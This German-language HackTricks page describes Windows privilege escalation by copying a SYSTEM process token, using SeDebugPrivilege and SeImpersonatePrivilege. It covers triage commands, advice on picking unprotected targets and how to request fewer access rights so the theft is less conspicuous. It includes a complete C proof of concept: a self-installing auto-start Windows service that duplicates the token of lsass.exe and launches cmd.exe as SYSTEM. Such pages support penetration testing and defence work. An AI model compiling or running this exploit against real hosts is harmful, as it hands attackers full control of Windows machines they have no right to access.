# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

Diese Seite behandelt die **manuelle Token-theft-Variante**, bei der ein **High Integrity**-Kontext, der bereits über **`SeDebugPrivilege`** und **`SeImpersonatePrivilege`** verfügt, einen geeigneten **SYSTEM**-Prozess öffnet, dessen **Token dupliziert** und einen **neuen Prozess** mit diesem Token startet.

Wenn du lediglich eine schnelle `SYSTEM`-Shell aus einem privilegierten Admin-Prozess benötigst, siehe auch:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

Wenn du keinen Process-handle-Pfad hast, aber über **`SeImpersonatePrivilege`** verfügst, ist der **named-pipe / Potato**-Weg normalerweise einfacher:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Schnelle Triage

Bevor du den Token-copy-Weg ausprobierst, stelle sicher, dass sich der aktuelle Prozess bereits in einem nützlichen Kontext befindet:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Hinweise:

- **`SeDebugPrivilege`** ermöglicht es dir, viele **nicht geschützte** SYSTEM-Prozesse zu öffnen, selbst wenn deren DACL dich normalerweise daran hindern würde.
- **`SeImpersonatePrivilege`** macht **`CreateProcessWithTokenW`** anschließend praktisch nutzbar.
- Wenn der Token-Copy-Pfad dir nur einen schwachen oder gefilterten SYSTEM-Token liefert, stiehl den Token einfach aus einem **anderen SYSTEM-Prozess**.

## Den Zielprozess sorgfältig auswählen

Die Technik wird normalerweise gegen **`lsass.exe`** demonstriert, aber unter modernen Windows-Versionen ist das häufig das **falsche Ziel**:

- Wenn **LSA Protection / RunAsPPL** aktiviert ist, ist **`lsass.exe`** geschützt, und ein normaler Admin-Prozess mit **`SeDebugPrivilege`** kann ihn trotzdem nicht öffnen.<sup>[[2]](#references)</sup>
- Bevorzuge **nicht-PPL-SYSTEM-Prozesse** wie **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** oder eine frühe **`svchost.exe`**-Instanz.
- **Geschützte Prozesse** und einige spezielle Prozesse wie **`System`** oder **`csrss.exe`** sind für diese Technik keine realistischen User-Mode-Ziele.
- Verwende **Process Hacker / Process Explorer** mit erhöhten Rechten, um zu überprüfen, ob der Ziel-Token vor dem Duplizieren tatsächlich über die gewünschten Privilegien verfügt.

## API-Details, die in der Praxis wichtig sind

Viele öffentliche PoCs fordern **`PROCESS_ALL_ACCESS`** und **`TOKEN_ALL_ACCESS`** an, aber das ist auffälliger als nötig. In der Praxis:

- Öffne den Zielprozess nur mit den benötigten Rechten (üblicherweise **`PROCESS_QUERY_INFORMATION`** oder **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- Öffne den Token mit den für die Prozesserstellung erforderlichen Rechten: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- Verwende **`DuplicateTokenEx(..., TokenPrimary, ...)`**, um einen **primären Token** zu erstellen; ein Impersonation-Token allein reicht nicht aus, um einen neuen Prozess zu erstellen.
- Wenn **`CreateProcessWithTokenW`** mit **`1314`** fehlschlägt, wechsle zu **`CreateProcessAsUserW`**.
- Wenn du aus einem **Dienst / Session 0** startest, beachte, dass **`CreateProcessWithTokenW`** den Child-Prozess in der **Sitzung des Aufrufers** belässt. Wenn du eine sichtbare Desktop-Shell benötigst, verwende **`CreateProcessAsUserW`** und verschiebe den Token in die gewünschte Sitzung.<sup>[[1]](#references)</sup>

Ein minimaler moderner Ablauf sieht folgendermaßen aus:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Vollständiger Service-PoC

Der folgende Code **nutzt die Privilegien `SeDebugPrivilege` und `SeImpersonatePrivilege` aus**, um den Token eines **als SYSTEM ausgeführten Prozesses** mit **allen Token-Privilegien** zu kopieren. In diesem Fall kann der Code als **Windows-Service-Binary** kompiliert und verwendet werden, um zu überprüfen, ob das Primitive funktioniert.<sup>[[3]](#references)</sup>

Der wichtigste Teil des **Codes, in dem die Rechteausweitung stattfindet**, befindet sich innerhalb der Funktion **`Exploit`**. In dieser Funktion ist zu sehen, dass nach **`lsass.exe`** gesucht, dessen **Token kopiert** und dieser Token schließlich verwendet wird, um ein neues **`cmd.exe`** mit allen Privilegien des kopierten Tokens zu starten.

Auf modernen Hosts möchte man **`lsass.exe`** häufig durch einen anderen **nicht-PPL-SYSTEM-Prozess** wie **`winlogon.exe`**, **`wininit.exe`** oder **`services.exe`** ersetzen.

Weitere als SYSTEM ausgeführte Prozesse mit allen oder den meisten Token-Privilegien sind: **`services.exe`**, **`svchost.exe`** (einige der zuerst gestarteten), **`wininit.exe`**, **`csrss.exe`** ... Denkt daran, dass ihr generell **keinen Token aus einem geschützten Prozess kopieren könnt**.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## Referenzen

- [1] [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [Zusätzlichen LSA-Schutz konfigurieren (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
- [3] [Mein Programm als Dienst ausführen (cboard.cprogramming.com) – Für den PoC verwendetes Windows-Dienst-Grundgerüst](https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html)

{{#include ../../banners/hacktricks-training.md}}
